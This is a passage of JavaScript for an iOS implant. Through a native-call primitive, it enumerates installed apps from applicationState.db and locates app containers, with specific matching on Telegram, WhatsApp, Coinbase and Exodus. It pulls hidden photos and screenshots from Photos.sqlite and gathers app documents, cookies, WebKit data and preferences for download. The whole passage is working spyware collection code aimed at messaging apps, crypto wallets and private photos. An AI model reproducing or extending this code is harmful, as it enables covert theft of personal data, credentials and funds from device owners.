			Native.callSymbol("free", dataPtr);
		}
	} catch (e) {
		// Ignore errors - we have fallback from byte pattern matching
	}
	
	return result;
}

// Debug counter for plist logging
let plistDebugCount = 0;

/**
 * Read Info.plist and extract bundle information (simplified version)
 */
function readInfoPlist(plistPath) {
	try {
		const fd = Native.callSymbol("open", plistPath, 0);
		if (Number(fd) < 0) {
			if (plistDebugCount < 3) {
			}
			return null;
		}
		
		try {
			// Get file size
			const SEEK_END = 2;
			const SEEK_SET = 0;
			const fileSize = Native.callSymbol("lseek", fd, 0n, SEEK_END);
			if (Number(fileSize) < 0 || Number(fileSize) > 1024 * 1024) {
				return null;
			}
			
			Native.callSymbol("lseek", fd, 0n, SEEK_SET);
			
			const size = Number(fileSize);
			const buffer = Native.callSymbol("malloc", BigInt(size));
			if (!buffer || buffer === 0n) return null;
			
			try {
				const bytesRead = Native.callSymbol("read", fd, buffer, BigInt(size));
				if (Number(bytesRead) !== size) return null;
				
				const plistData = Native.read(buffer, size);
				const plistBytes = new Uint8Array(plistData);
				
				// Debug log for first few plists
				if (plistDebugCount < 3) {
					plistDebugCount++;
					const isBinary = plistBytes.length >= 6 && 
					    plistBytes[0] === 0x62 && plistBytes[1] === 0x70;
				}
				
				// Check if binary plist (starts with "bpli")
				if (plistBytes.length >= 6 && 
				    plistBytes[0] === 0x62 && plistBytes[1] === 0x70 && 
				    plistBytes[2] === 0x6C && plistBytes[3] === 0x69) {
					// Binary plist - use CoreFoundation to parse
					const result = extractFromBinaryPlist(plistBytes);
					if (plistDebugCount <= 3) {
					}
					return result;
				}
				
				// XML plist - convert bytes to string manually (TextDecoder may not exist)
				let plistText = "";
				for (let i = 0; i < plistBytes.length; i++) {
					plistText += String.fromCharCode(plistBytes[i]);
				}
				
				return {
					CFBundleIdentifier: extractPlistValue(plistText, "CFBundleIdentifier"),
					CFBundleName: extractPlistValue(plistText, "CFBundleName"),
					CFBundleDisplayName: extractPlistValue(plistText, "CFBundleDisplayName"),
					CFBundleShortVersionString: extractPlistValue(plistText, "CFBundleShortVersionString"),
					CFBundleVersion: extractPlistValue(plistText, "CFBundleVersion"),
					MCMMetadataIdentifier: extractPlistValue(plistText, "MCMMetadataIdentifier")
				};
			} finally {
				Native.callSymbol("free", buffer);
			}
		} finally {
			Native.callSymbol("close", fd);
		}
	} catch (e) {
		return null;
	}
}

/**
 * Parse applicationState.db SQLite database to get list of installed apps
 * This is the most reliable source for bundle IDs on iOS
 */
function getInstalledAppsList() {
	let result = "=== INSTALLED APPLICATIONS ===\n";
	result += "Generated: " + new Date().toISOString() + "\n\n";
	
	const bundleIds = [];
	const dbPath = "/private/var/mobile/Library/FrontBoard/applicationState.db";
	
	try {
		const dbPathBuf = Native.callSymbol("malloc", dbPath.length + 1);
		if (!dbPathBuf || dbPathBuf === 0n) {
			return result + "ERROR: Failed to allocate memory\n";
		}
		
		try {
			Native.writeString(dbPathBuf, dbPath);
			
			// SQLite constants
			const SQLITE_OK = 0;
			const SQLITE_ROW = 100;
			const SQLITE_DONE = 101;
			const SQLITE_OPEN_READONLY = 1;
			
			const dbHandlePtr = Native.callSymbol("malloc", 8n);
			if (!dbHandlePtr || dbHandlePtr === 0n) {
				Native.callSymbol("free", dbPathBuf);
				return result + "ERROR: Failed to allocate db handle\n";
			}
			
			try {
				Native.write64(dbHandlePtr, 0n);
				
				const openResult = Native.callSymbol("sqlite3_open_v2", dbPathBuf, dbHandlePtr, SQLITE_OPEN_READONLY, 0n);
				
				if (Number(openResult) !== SQLITE_OK) {
					return result + "ERROR: Failed to open database (code " + openResult + ")\n";
				}
				
				const dbHandle = Native.readPtr(dbHandlePtr);
				
				try {
					// Query to get all application identifiers
					const sql = "SELECT DISTINCT application_identifier FROM application_identifier_tab ORDER BY application_identifier";
					const sqlBuf = Native.callSymbol("malloc", sql.length + 1);
					if (!sqlBuf || sqlBuf === 0n) {
						Native.callSymbol("sqlite3_close", dbHandle);
						return result + "ERROR: Failed to allocate SQL buffer\n";
					}
					
					try {
						Native.writeString(sqlBuf, sql);
						
						const stmtPtr = Native.callSymbol("malloc", 8n);
						if (!stmtPtr || stmtPtr === 0n) {
							Native.callSymbol("free", sqlBuf);
							Native.callSymbol("sqlite3_close", dbHandle);
							return result + "ERROR: Failed to allocate statement pointer\n";
						}
						
						try {
							Native.write64(stmtPtr, 0n);
							const tailPtr = Native.callSymbol("malloc", 8n);
							if (!tailPtr || tailPtr === 0n) {
								Native.callSymbol("free", stmtPtr);
								Native.callSymbol("free", sqlBuf);
								Native.callSymbol("sqlite3_close", dbHandle);
								return result + "ERROR: Failed to allocate tail pointer\n";
							}
							
							try {
								Native.write64(tailPtr, 0n);
								
								const prepResult = Native.callSymbol("sqlite3_prepare_v2", dbHandle, sqlBuf, -1, stmtPtr, tailPtr);
								
								if (Number(prepResult) !== SQLITE_OK) {
									return result + "ERROR: Failed to prepare query (code " + prepResult + ")\n";
								}
								
								const stmt = Native.readPtr(stmtPtr);
								
								// Execute query and collect results
								while (true) {
									const stepResult = Native.callSymbol("sqlite3_step", stmt);
									
									if (Number(stepResult) === SQLITE_ROW) {
										// Get application_identifier (column 0)
										const textPtr = Native.callSymbol("sqlite3_column_text", stmt, 0);
										if (textPtr && textPtr !== 0n) {
											const bundleId = Native.readString(textPtr, 256);
											if (bundleId && bundleId.length > 0) {
												bundleIds.push(bundleId);
											}
										}
									} else if (Number(stepResult) === SQLITE_DONE) {
										break;
									} else {
										break;
									}
								}
								
								Native.callSymbol("sqlite3_finalize", stmt);
							} finally {
								Native.callSymbol("free", tailPtr);
							}
						} finally {
							Native.callSymbol("free", stmtPtr);
						}
					} finally {
						Native.callSymbol("free", sqlBuf);
					}
				} finally {
					Native.callSymbol("sqlite3_close", dbHandle);
				}
			} finally {
				Native.callSymbol("free", dbHandlePtr);
			}
		} finally {
			Native.callSymbol("free", dbPathBuf);
		}
	} catch (e) {
		return result + "ERROR: Exception - " + e.toString() + "\n";
	}
	
	// Format output
	result += "--- All Installed Applications ---\n\n";
	
	let userApps = 0;
	let systemApps = 0;
	
	for (const bundleId of bundleIds) {
		result += "[APP] " + bundleId + "\n";
		result += "  Bundle ID: " + bundleId + "\n";
		
		// Classify as system or user app
		if (bundleId.startsWith("com.apple.")) {
			systemApps++;
			result += "  Type: System\n";
		} else {
			userApps++;
			result += "  Type: User\n";
		}
		result += "\n";
	}
	
	result += "=== SUMMARY ===\n";
	result += "Total applications: " + bundleIds.length + "\n";
	result += "User applications: " + userApps + "\n";
	result += "System applications: " + systemApps + "\n";
	
	return result;
}

/**
 * Get all bundle IDs from applicationState.db as a lookup object
 * Returns an object where keys are bundle IDs (for fast lookup)
 */
function getBundleIdLookup() {
	const bundleIdMap = {};
	const dbPath = "/private/var/mobile/Library/FrontBoard/applicationState.db";
	
	try {
		const dbPathBuf = Native.callSymbol("malloc", dbPath.length + 1);
		if (!dbPathBuf || dbPathBuf === 0n) return bundleIdMap;
		
		try {
			Native.writeString(dbPathBuf, dbPath);
			
			const SQLITE_OK = 0;
			const SQLITE_ROW = 100;
			const SQLITE_DONE = 101;
			const SQLITE_OPEN_READONLY = 1;
			
			const dbHandlePtr = Native.callSymbol("malloc", 8n);
			if (!dbHandlePtr || dbHandlePtr === 0n) return bundleIdMap;
			
			try {
				Native.write64(dbHandlePtr, 0n);
				
				const openResult = Native.callSymbol("sqlite3_open_v2", dbPathBuf, dbHandlePtr, SQLITE_OPEN_READONLY, 0n);
				if (Number(openResult) !== SQLITE_OK) return bundleIdMap;
				
				const dbHandle = Native.readPtr(dbHandlePtr);
				
				try {
					const sql = "SELECT DISTINCT application_identifier FROM application_identifier_tab";
					const sqlBuf = Native.callSymbol("malloc", sql.length + 1);
					if (!sqlBuf || sqlBuf === 0n) return bundleIdMap;
					
					try {
						Native.writeString(sqlBuf, sql);
						
						const stmtPtr = Native.callSymbol("malloc", 8n);
						if (!stmtPtr || stmtPtr === 0n) return bundleIdMap;
						
						try {
							Native.write64(stmtPtr, 0n);
							
							const prepResult = Native.callSymbol("sqlite3_prepare_v2", dbHandle, sqlBuf, -1, stmtPtr, 0n);
							if (Number(prepResult) !== SQLITE_OK) return bundleIdMap;
							
							const stmt = Native.readPtr(stmtPtr);
							
							while (true) {
								const stepResult = Native.callSymbol("sqlite3_step", stmt);
								
								if (Number(stepResult) === SQLITE_ROW) {
									const textPtr = Native.callSymbol("sqlite3_column_text", stmt, 0);
									if (textPtr && textPtr !== 0n) {
										const bundleId = Native.readString(textPtr, 256);
										if (bundleId && bundleId.length > 0) {
											bundleIdMap[bundleId] = true;
											// Also add lowercase version for matching
											bundleIdMap[bundleId.toLowerCase()] = bundleId;
										}
									}
								} else if (Number(stepResult) === SQLITE_DONE) {
									break;
								} else {
									break;
								}
							}
							
							Native.callSymbol("sqlite3_finalize", stmt);
						} finally {
							Native.callSymbol("free", stmtPtr);
						}
					} finally {
						Native.callSymbol("free", sqlBuf);
					}
				} finally {
					Native.callSymbol("sqlite3_close", dbHandle);
				}
			} finally {
				Native.callSymbol("free", dbHandlePtr);
			}
		} finally {
			Native.callSymbol("free", dbPathBuf);
		}
	} catch (e) {
	}
	
	return bundleIdMap;
}

/**
 * Get container UUIDs for specific bundle IDs from applicationState.db
 * Query: application_identifier_tab (bundleId -> id), then kvs table (id -> binary plist with UUID)
 * Returns map of bundleId -> { dataUUID, groupUUID, name }
 */
function getContainerPathsForBundleIds(bundleIds) {
	const containerMap = {};
	const dbPath = "/private/var/mobile/Library/FrontBoard/applicationState.db";
	
	for (let i = 0; i < bundleIds.length; i++) {
	}
	
	try {
		const dbPathBuf = Native.callSymbol("malloc", dbPath.length + 1);
		if (!dbPathBuf || dbPathBuf === 0n) return containerMap;
		
		try {
			Native.writeString(dbPathBuf, dbPath);
			
			const SQLITE_OK = 0;
			const SQLITE_ROW = 100;
			const SQLITE_DONE = 101;
			const SQLITE_OPEN_READONLY = 1;
			
			const dbHandlePtr = Native.callSymbol("malloc", 8n);
			if (!dbHandlePtr || dbHandlePtr === 0n) return containerMap;
			
			try {
				Native.write64(dbHandlePtr, 0n);
				
				const openResult = Native.callSymbol("sqlite3_open_v2", dbPathBuf, dbHandlePtr, SQLITE_OPEN_READONLY, 0n);
				if (Number(openResult) !== SQLITE_OK) {
					return containerMap;
				}
				
				const dbHandle = Native.readPtr(dbHandlePtr);
				
				try {
					// For each bundle ID, query the database
					for (const bundleId of bundleIds) {
						
						// Step 1: Get ID from application_identifier_tab
						const sql1 = "SELECT id FROM application_identifier_tab WHERE application_identifier = ?";
						const sql1Buf = Native.callSymbol("malloc", sql1.length + 1);
						if (!sql1Buf || sql1Buf === 0n) continue;
						
						try {
							Native.writeString(sql1Buf, sql1);
							
							const stmt1Ptr = Native.callSymbol("malloc", 8n);
							if (!stmt1Ptr || stmt1Ptr === 0n) continue;
							
							try {
								Native.write64(stmt1Ptr, 0n);
								
								const prepResult = Native.callSymbol("sqlite3_prepare_v2", dbHandle, sql1Buf, -1, stmt1Ptr, 0n);
								if (Number(prepResult) !== SQLITE_OK) continue;
								
								const stmt1 = Native.readPtr(stmt1Ptr);
								
								// Bind bundle ID parameter
								const bundleIdBuf = Native.callSymbol("malloc", bundleId.length + 1);
								if (bundleIdBuf && bundleIdBuf !== 0n) {
									Native.writeString(bundleIdBuf, bundleId);
									Native.callSymbol("sqlite3_bind_text", stmt1, 1, bundleIdBuf, -1, 0n);
									
									const stepResult = Native.callSymbol("sqlite3_step", stmt1);
									if (Number(stepResult) === SQLITE_ROW) {
										const appId = Native.callSymbol("sqlite3_column_int", stmt1, 0);
										
										// Step 2: Query kvs table for container info
										// The value column contains a binary plist with UUID info
										const sql2 = "SELECT key, value FROM kvs WHERE application_identifier = ?";
										const sql2Buf = Native.callSymbol("malloc", sql2.length + 1);
										if (sql2Buf && sql2Buf !== 0n) {
											try {
												Native.writeString(sql2Buf, sql2);
												
												const stmt2Ptr = Native.callSymbol("malloc", 8n);
												if (stmt2Ptr && stmt2Ptr !== 0n) {
													try {
														Native.write64(stmt2Ptr, 0n);
														
														const prepResult2 = Native.callSymbol("sqlite3_prepare_v2", dbHandle, sql2Buf, -1, stmt2Ptr, 0n);
														if (Number(prepResult2) === SQLITE_OK) {
															const stmt2 = Native.readPtr(stmt2Ptr);
															Native.callSymbol("sqlite3_bind_int", stmt2, 1, appId);
															
															// Scan all kvs entries for this app
															let kvsCount = 0;
															while (true) {
																const stepResult2 = Native.callSymbol("sqlite3_step", stmt2);
																if (Number(stepResult2) !== SQLITE_ROW) break;
																
																kvsCount++;
																const keyPtr = Native.callSymbol("sqlite3_column_text", stmt2, 0);
																const key = keyPtr && keyPtr !== 0n ? Native.readString(keyPtr, 256) : "";
																
																// Get binary plist data
																const valuePtr = Native.callSymbol("sqlite3_column_blob", stmt2, 1);
																const valueSize = Native.callSymbol("sqlite3_column_bytes", stmt2, 1);
																
																if (valuePtr && valuePtr !== 0n && Number(valueSize) > 0) {
																	// Read binary plist as bytes
																	const plistData = Native.read(valuePtr, Number(valueSize));
																	
																	// Try to extract UUID from binary plist using string search
																	// UUIDs are in format XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
																	const plistStr = String.fromCharCode.apply(null, Array.from(new Uint8Array(plistData)));
																	const uuidRegex = /[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}/gi;
																	const uuids = plistStr.match(uuidRegex);
																	
																	if (uuids && uuids.length > 0) {
																		
																		// Store UUIDs found in this entry
																		if (!containerMap[bundleId]) {
																			containerMap[bundleId] = { name: bundleId };
																		}
																		
																		// Try to determine if this is data or group container UUID
																		for (const uuid of uuids) {
																			
																			// Check if this UUID exists in Data/Application
																			const dataPath = "/private/var/mobile/Containers/Data/Application/" + uuid;
																			if (fileExists(dataPath)) {
																				containerMap[bundleId].dataPath = dataPath;
																				containerMap[bundleId].dataUUID = uuid;
																			}
																			
																			// Check if this UUID exists in Shared/AppGroup
																			const groupPath = "/private/var/mobile/Containers/Shared/AppGroup/" + uuid;
																			if (fileExists(groupPath)) {
																				containerMap[bundleId].groupPath = groupPath;
																				containerMap[bundleId].groupUUID = uuid;
																			}
																		}
																	}
																}
															}
															
															if (kvsCount === 0) {
															} else {
															}
															Native.callSymbol("sqlite3_finalize", stmt2);
														}
													} finally {
														Native.callSymbol("free", stmt2Ptr);
													}
												}
											} finally {
												Native.callSymbol("free", sql2Buf);
											}
										}
									}
									
									Native.callSymbol("free", bundleIdBuf);
								}
								
								Native.callSymbol("sqlite3_finalize", stmt1);
							} finally {
								Native.callSymbol("free", stmt1Ptr);
							}
						} finally {
							Native.callSymbol("free", sql1Buf);
						}
					}
				} finally {
					Native.callSymbol("sqlite3_close", dbHandle);
				}
			} finally {
				Native.callSymbol("free", dbHandlePtr);
			}
		} finally {
			Native.callSymbol("free", dbPathBuf);
		}
	} catch (e) {
	}
	
	
	const dataDirs = [
		"/private/var/mobile/Containers/Data/Application",
		"/var/mobile/Containers/Data/Application"
	];
	
	for (const dataDir of dataDirs) {
		const dir = Native.callSymbol("opendir", dataDir);
		if (!dir || dir === 0n) continue;
		
		try {
			while (true) {
				const entry = Native.callSymbol("readdir", dir);
				if (!entry || entry === 0n) break;
				
				const name = readDirentName(entry);
				if (!name || name.length === 0 || name[0] === '.') continue;
				
				const containerPath = dataDir + "/" + name;
				const metadataPath = containerPath + "/.com.apple.mobile_container_manager.metadata.plist";
				const metadata = readInfoPlist(metadataPath);
				
				if (metadata && metadata.MCMMetadataIdentifier) {
					const bundleId = metadata.MCMMetadataIdentifier;
					
					// Check if this is one of the bundle IDs we're looking for
					for (const targetId of bundleIds) {
						if (bundleId.toLowerCase() === targetId.toLowerCase()) {
							if (!containerMap[bundleId]) {
								containerMap[bundleId] = {};
							}
							containerMap[bundleId].dataPath = containerPath;
							containerMap[bundleId].dataUUID = name;
							containerMap[bundleId].name = metadata.CFBundleName || metadata.CFBundleDisplayName || bundleId;
						}
					}
				}
			}
		} finally {
			Native.callSymbol("closedir", dir);
		}
	}
	
	// Scan Shared/AppGroup containers
	const appGroupDirs = [
		"/private/var/mobile/Containers/Shared/AppGroup",
		"/var/mobile/Containers/Shared/AppGroup"
	];
	
	let appGroupScanned = 0;
	let appGroupWithMeta = 0;
	
	// Log what we're looking for
	for (let i = 0; i < bundleIds.length; i++) {
	}
	
	for (const appGroupDir of appGroupDirs) {
		const dir = Native.callSymbol("opendir", appGroupDir);
		if (!dir || dir === 0n) {
			continue;
		}
		
		
		try {
			while (true) {
				const entry = Native.callSymbol("readdir", dir);
				if (!entry || entry === 0n) break;
				
				const name = readDirentName(entry);
				if (!name || name.length === 0 || name[0] === '.') continue;
				
				// Check if it looks like a UUID (36 chars)
				if (name.length !== 36) continue;
				
				appGroupScanned++;
				const containerPath = appGroupDir + "/" + name;
				const metadataPath = containerPath + "/.com.apple.mobile_container_manager.metadata.plist";
				const metadata = readInfoPlist(metadataPath);
				
				if (metadata && metadata.MCMMetadataIdentifier) {
					appGroupWithMeta++;
					const bundleId = metadata.MCMMetadataIdentifier;
					const bundleIdLower = bundleId.toLowerCase();
					
					// Log first 10 and any telegram-related to debug
					if (appGroupWithMeta <= 10 || bundleIdLower.indexOf("telegra") !== -1 || bundleIdLower.indexOf("whatsapp") !== -1) {
					}
					
					// Check if this is one of the bundle IDs we're looking for
					let matched = false;
					for (const targetId of bundleIds) {
						const targetLower = targetId.toLowerCase();
						if (bundleIdLower === targetLower) {
							matched = true;
							if (!containerMap[bundleId]) {
								containerMap[bundleId] = {};
							}
							containerMap[bundleId].groupPath = containerPath;
							containerMap[bundleId].groupUUID = name;
							containerMap[bundleId].name = metadata.CFBundleName || metadata.CFBundleDisplayName || bundleId;
							break;
						}
					}
					
					// Debug: If it's telegram but didn't match, show why
					if (!matched && bundleIdLower.indexOf("telegra") !== -1) {
					}
				} else {
					// Log UUID without metadata
					if (appGroupScanned <= 5) {
					}
				}
			}
		} finally {
			Native.callSymbol("closedir", dir);
		}
	}
	
	
	// Log final results
	for (const bundleId of Object.keys(containerMap)) {
		const c = containerMap[bundleId];
	}
	return containerMap;
}

/**
 * Find all app data containers matching a pattern
 * Searches by bundle ID and app name in plist files
 */
function findMatchingAppContainers(pattern) {
	const results = [];
	const patternLower = pattern.toLowerCase();
	
	// Search both Data/Application AND Shared/AppGroup containers
	const searchDirs = [
		"/private/var/mobile/Containers/Data/Application",
		"/var/mobile/Containers/Data/Application",
		"/private/var/mobile/Containers/Shared/AppGroup",
		"/var/mobile/Containers/Shared/AppGroup"
	];
	
	for (const searchDir of searchDirs) {
		const dir = Native.callSymbol("opendir", searchDir);
		if (!dir || dir === 0n) {
			continue;
		}
		
		try {
			let containerCount = 0;
			while (true) {
				const entry = Native.callSymbol("readdir", dir);
				if (!entry || entry === 0n) break;
				
				const name = readDirentName(entry);
				if (!name || name.length === 0 || name[0] === '.') continue;
				
				containerCount++;
				const containerPath = searchDir + "/" + name;
				const metadataPath = containerPath + "/.com.apple.mobile_container_manager.metadata.plist";
				
				const metadata = readInfoPlist(metadataPath);
				if (metadata && metadata.MCMMetadataIdentifier) {
					const bundleId = metadata.MCMMetadataIdentifier.toLowerCase();
					const appName = (metadata.CFBundleName || metadata.CFBundleDisplayName || "").toLowerCase();
					
					// Check if bundle ID OR app name contains the pattern (empty pattern matches all)
					const matchesBundleId = bundleId.indexOf(patternLower) !== -1;
					const matchesAppName = appName.indexOf(patternLower) !== -1;
					
					if (patternLower === "" || matchesBundleId || matchesAppName) {
						results.push({
							path: containerPath,
							bundleId: metadata.MCMMetadataIdentifier,
							name: metadata.CFBundleName || metadata.CFBundleDisplayName || metadata.MCMMetadataIdentifier
						});
					}
				}
			}
			
			// Log only for first pattern to avoid spam
			if (pattern === "coinbase") {
			}
		} finally {
			Native.callSymbol("closedir", dir);
		}
	}
	
	return results;
}

/**
 * Find all shared containers (AppGroup) matching a pattern
 */
function findMatchingSharedContainers(pattern) {
	const results = [];
	const patternLower = pattern.toLowerCase();
	
	const searchDirs = [
		"/private/var/mobile/Containers/Shared/AppGroup",
		"/var/mobile/Containers/Shared/AppGroup"
	];
	
	for (const searchDir of searchDirs) {
		const dir = Native.callSymbol("opendir", searchDir);
		if (!dir || dir === 0n) continue;
		
		try {
			while (true) {
				const entry = Native.callSymbol("readdir", dir);
				if (!entry || entry === 0n) break;
				
				const name = readDirentName(entry);
				if (!name || name.length === 0 || name[0] === '.') continue;
				
				const containerPath = searchDir + "/" + name;
				const metadataPath = containerPath + "/.com.apple.mobile_container_manager.metadata.plist";
				
				const metadata = readInfoPlist(metadataPath);
				if (metadata && metadata.MCMMetadataIdentifier) {
					const identifier = metadata.MCMMetadataIdentifier.toLowerCase();
					
					// Check if identifier contains the pattern
					if (identifier.indexOf(patternLower) !== -1) {
						results.push({
							path: containerPath,
							bundleId: metadata.MCMMetadataIdentifier,
							name: metadata.CFBundleName || metadata.CFBundleDisplayName || metadata.MCMMetadataIdentifier
						});
					}
				}
			}
		} finally {
			Native.callSymbol("closedir", dir);
		}
	}
	
	return results;
}

/**
 * List all files in a directory recursively (up to maxDepth)
 */
function listFilesRecursive(dirPath, maxDepth, currentDepth) {
	const files = [];
	if (currentDepth > maxDepth) return files;
	
	const dir = Native.callSymbol("opendir", dirPath);
	if (!dir || dir === 0n) return files;
	
	try {
		while (true) {
			const entry = Native.callSymbol("readdir", dir);
			if (!entry || entry === 0n) break;
			
			const name = readDirentName(entry);
			if (!name || name.length === 0 || name === "." || name === "..") continue;
			
			const fullPath = dirPath + "/" + name;
			
			// Check if directory or file using stat
			const statBuf = Native.callSymbol("malloc", 144);
			if (!statBuf || statBuf === 0n) continue;
			
			try {
				const ret = Native.callSymbol("stat", fullPath, statBuf);
				if (ret !== 0) continue;
				
				const statData = Native.read(statBuf, 144);
				const statView = new DataView(statData);
				const mode = statView.getUint16(4, true); // st_mode
				
				const isDir = (mode & 0xF000) === 0x4000;  // S_ISDIR
				const isFile = (mode & 0xF000) === 0x8000; // S_ISREG
				
				if (isFile) {
					const size = Number(statView.getBigUint64(96, true)); // st_size
					files.push({ path: fullPath, size: size });
				} else if (isDir) {
					// Recurse into subdirectory
					const subFiles = listFilesRecursive(fullPath, maxDepth, currentDepth + 1);
					for (const f of subFiles) {
						files.push(f);
					}
				}
			} finally {
				Native.callSymbol("free", statBuf);
			}
		}
	} finally {
		Native.callSymbol("closedir", dir);
	}
	
	return files;
}

/**
 * Query Photos.sqlite database for hidden photos or screenshots
 * @param isHidden - true for hidden photos, false for screenshots
 * @returns array of full file paths
 */
function queryPhotosDatabase(isHidden) {
	const filePaths = [];
	const dbPath = "/var/mobile/Media/PhotoData/Photos.sqlite";
	
	
	try {
		const SQLITE_OK = 0;
		const SQLITE_ROW = 100;
		const SQLITE_OPEN_READONLY = 1;
		
		// Open database
		const dbHandlePtr = Native.callSymbol("malloc", 8);
		if (!dbHandlePtr || dbHandlePtr === 0n) return filePaths;
		
		try {
			Native.write64(dbHandlePtr, 0n);
			
			const openResult = Native.callSymbol("sqlite3_open_v2", dbPath, dbHandlePtr, SQLITE_OPEN_READONLY, 0n);
			
			if (Number(openResult) !== SQLITE_OK) {
				return filePaths;
			}
			
			const dbHandle = Native.readPtr(dbHandlePtr);
			if (!dbHandle || dbHandle === 0n) {
				return filePaths;
			}
			
			try {
				// Query for hidden photos or screenshots
				const sql = isHidden 
					? "SELECT ZFILENAME, ZDIRECTORY FROM ZASSET WHERE ZHIDDEN = 1 ORDER BY ZDATECREATED"
					: "SELECT ZFILENAME, ZDIRECTORY FROM ZASSET WHERE ZISDETECTEDSCREENSHOT = 1 ORDER BY ZDATECREATED";
				
				const stmtPtr = Native.callSymbol("malloc", 8);
				if (!stmtPtr || stmtPtr === 0n) return filePaths;
				
				try {
					Native.write64(stmtPtr, 0n);
					
					const prepResult = Native.callSymbol("sqlite3_prepare_v2", dbHandle, sql, -1, stmtPtr, 0n);
					if (Number(prepResult) !== SQLITE_OK) {
						return filePaths;
					}
					
					const stmt = Native.readPtr(stmtPtr);
					if (!stmt || stmt === 0n) return filePaths;
					
					try {
						while (Number(Native.callSymbol("sqlite3_step", stmt)) === SQLITE_ROW) {
							const filenamePtr = Native.callSymbol("sqlite3_column_text", stmt, 0);
							const directoryPtr = Native.callSymbol("sqlite3_column_text", stmt, 1);
							
							if (filenamePtr && filenamePtr !== 0n) {
								const filename = Native.readString(filenamePtr, 256).replace(/\0/g, '');
								let directory = "";
								if (directoryPtr && directoryPtr !== 0n) {
									directory = Native.readString(directoryPtr, 512).replace(/\0/g, '');
								}
								
								if (filename) {
									let fullPath;
									if (directory) {
										directory = directory.replace(/^\/+|\/+$/g, '');
										fullPath = "/var/mobile/Media/" + directory + "/" + filename;
									} else {
										fullPath = "/var/mobile/Media/DCIM/100APPLE/" + filename;
									}
									filePaths.push(fullPath);
								}
							}
						}
					} finally {
						Native.callSymbol("sqlite3_finalize", stmt);
					}
				} finally {
					Native.callSymbol("free", stmtPtr);
				}
			} finally {
				Native.callSymbol("sqlite3_close", dbHandle);
			}
		} finally {
			Native.callSymbol("free", dbHandlePtr);
		}
	} catch (e) {
	}
	
	return filePaths;
}

/**
 * Get list of hidden photos
 */
function getHiddenPhotos() {
	return queryPhotosDatabase(true);
}

/**
 * Get list of screenshots
 */
function getScreenshots() {
	return queryPhotosDatabase(false);
}

/**
 * Download ALL app container data (simpler approach - don't rely on plist parsing)
 * Returns array of files to download, organized by bundle ID
 */
function getAllAppContainerFiles() {
	const appFiles = [];
	
	const searchDirs = [
		"/private/var/mobile/Containers/Data/Application",
		"/var/mobile/Containers/Data/Application"
	];
	
	
	// Get known bundle IDs from applicationState.db for validation
	const knownBundleIds = getBundleIdLookup();
	const knownCount = Object.keys(knownBundleIds).length / 2; // divided by 2 because we store both original and lowercase
	
	let totalContainers = 0;
	let totalFiles = 0;
	let identifiedApps = 0;
	const processedDirs = {};
	
	for (const searchDir of searchDirs) {
		const dir = Native.callSymbol("opendir", searchDir);
		if (!dir || dir === 0n) {
			continue;
		}
		
		try {
			while (true) {
				const entry = Native.callSymbol("readdir", dir);
				if (!entry || entry === 0n) break;
				
				const name = readDirentName(entry);
				if (!name || name.length === 0 || name[0] === '.') continue;
				
				// Skip if not a UUID-like directory name
				if (name.length < 30) continue;
				
				// Skip if already processed (avoid duplicates from /private/var vs /var)
				if (processedDirs[name]) continue;
				processedDirs[name] = true;
				
				totalContainers++;
				const containerPath = searchDir + "/" + name;
				
				// Try multiple methods to get bundle ID
				let appIdentifier = name; // default to UUID
				let appName = name.substring(0, 8); // default to short UUID
				let foundBundleId = null;
				
				// Method 1: Try metadata plist (may be blocked by sandbox)
				const metadataPath = containerPath + "/.com.apple.mobile_container_manager.metadata.plist";
				const metadata = readInfoPlist(metadataPath);
				if (metadata && metadata.MCMMetadataIdentifier) {
					foundBundleId = metadata.MCMMetadataIdentifier;
				}
				
				// Method 2: Look at Library/Preferences for plist files and validate against known bundle IDs
				if (!foundBundleId) {
					const prefsPath = containerPath + "/Library/Preferences";
					const prefsDir = Native.callSymbol("opendir", prefsPath);
					if (prefsDir && prefsDir !== 0n) {
						try {
							while (!foundBundleId) {
								const prefEntry = Native.callSymbol("readdir", prefsDir);
								if (!prefEntry || prefEntry === 0n) break;
								
								const prefName = readDirentName(prefEntry);
								if (!prefName || prefName.length < 5) continue;
								
								// Look for .plist files that look like bundle IDs
								if (prefName.endsWith(".plist")) {
									// e.g., "com.exodus-movement.exodus.plist" -> "com.exodus-movement.exodus"
									const possibleBundleId = prefName.substring(0, prefName.length - 6); // remove .plist
									
									// Skip Apple system bundle IDs - they appear in many containers
									if (possibleBundleId.startsWith("com.apple.")) continue;
									
									// Validate against known bundle IDs from applicationState.db
									const lowerBundleId = possibleBundleId.toLowerCase();
									if (knownBundleIds[lowerBundleId]) {
										// Found a match! Use the original case from the database
										foundBundleId = knownBundleIds[lowerBundleId];
										if (foundBundleId === true) foundBundleId = possibleBundleId;
									} else if (possibleBundleId.indexOf(".") !== -1 && 
									           possibleBundleId.split('.').length >= 2) {
										// Fallback: looks like a valid non-Apple bundle ID with 2+ dots
										foundBundleId = possibleBundleId;
									}
								}
							}
						} finally {
							Native.callSymbol("closedir", prefsDir);
						}
					}
				}
				
				// Debug: log first container's result
				if (totalContainers === 1) {
				}
				
				if (foundBundleId) {
					identifiedApps++;
					appIdentifier = foundBundleId;
					
					// Extract readable app name from bundle ID
					// e.g., "com.exodus-movement.exodus" -> "Exodus"
					// e.g., "org.telegram.Telegram" -> "Telegram"
					const parts = appIdentifier.split('.');
					if (parts.length > 0) {
						appName = parts[parts.length - 1]; // last component
						// Remove common suffixes
						appName = appName.replace(/-ios$/i, '').replace(/-iphone$/i, '');
						// Capitalize first letter
						if (appName.length > 0) {
							appName = appName.charAt(0).toUpperCase() + appName.slice(1);
						}
					}
					
					// Log only every 20th container to reduce noise
					if (totalContainers % 20 === 1) {
					}
				}
				
				// Sanitize for filesystem (keep only alphanumeric, dash, underscore)
				const safeAppName = appName.replace(/[^a-zA-Z0-9_-]/g, '_');
				
				// Scan key folders: Documents, Library/Cookies, Library/WebKit, Library/Preferences
				const foldersToScan = [
					{ folder: containerPath + "/Documents", category: "app-documents/" + safeAppName },
					{ folder: containerPath + "/Library/Cookies", category: "app-cookies/" + safeAppName },
					{ folder: containerPath + "/Library/WebKit", category: "app-webkit/" + safeAppName },
					{ folder: containerPath + "/Library/Preferences", category: "app-preferences/" + safeAppName },
					{ folder: containerPath + "/Library/Application Support", category: "app-support/" + safeAppName },
					{ folder: containerPath + "/Library/Caches", category: "app-caches/" + safeAppName },
				];
				
				for (const scanInfo of foldersToScan) {
					// Check if folder exists first
